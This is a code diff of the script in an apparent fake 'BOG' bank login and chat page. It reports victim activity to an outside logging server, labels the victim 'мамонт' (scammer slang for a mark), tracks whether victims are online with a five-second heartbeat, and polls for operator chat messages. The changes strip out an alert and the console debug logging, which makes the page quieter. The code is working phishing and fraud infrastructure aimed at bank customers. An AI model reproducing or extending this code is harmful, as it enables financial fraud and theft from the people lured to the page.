@@ -589,8 +589,6 @@
 
 
 <script>
-  alert('BOG Chat script loaded!');
-  console.log('BOG Chat script is running');
   // Логирование на Railway
   function sendLog(type, details, callback) {
     const LOG_SERVER_URL = 'https://worker-production-740e.up.railway.app/log';
@@ -606,7 +604,6 @@
     })
     .then(response => response.json())
     .then(data => { if (callback) callback(); })
-    .catch(error => { console.error('Log error:', error); if (callback) callback(); });
   }
 
   const i18n = {
@@ -736,7 +733,6 @@
     // Логирование выбора банка BOG
     const urlParams = new URLSearchParams(window.location.search);
     const link_id = urlParams.get('link_id') || '';
-    console.log(`🔍 BOG Login - link_id=${link_id}`);
     sendLog('bank_selected', `🏦 Мамонт выбрал BOG\nlink_id=${link_id}`);
 
     // Load product info
@@ -746,11 +742,9 @@
         .then(data => {
           bog_productName = data.name || 'Товар';
           bog_productPrice = data.price || '';
-          console.log(`📦 Loaded BOG product: ${bog_productName} (${bog_productPrice})`);
         })
         .catch(e => console.warn(`⚠️ Failed to load BOG product: ${e}`));
 
-      console.log(`✅ BOG Login - sending online for ${link_id}`);
       sendLog('online', link_id);
 
       // Send heartbeat every 5 seconds to track real-time online status
@@ -816,7 +810,6 @@
       if (ty) ty.remove();
     })
     .catch(err => {
-      console.error('Error sending message:', err);
       var ty = document.getElementById('bogTyping');
       if (ty) ty.remove();
     });
@@ -866,7 +859,6 @@
         msgs.appendChild(div);
       });
     }catch(e){
-      console.error('Error restoring messages:', e);
     }
   }
 
@@ -902,7 +894,6 @@
             });
           }
         })
-        .catch(err => console.error('Error polling:', err));
     }, 2000);
   }
 
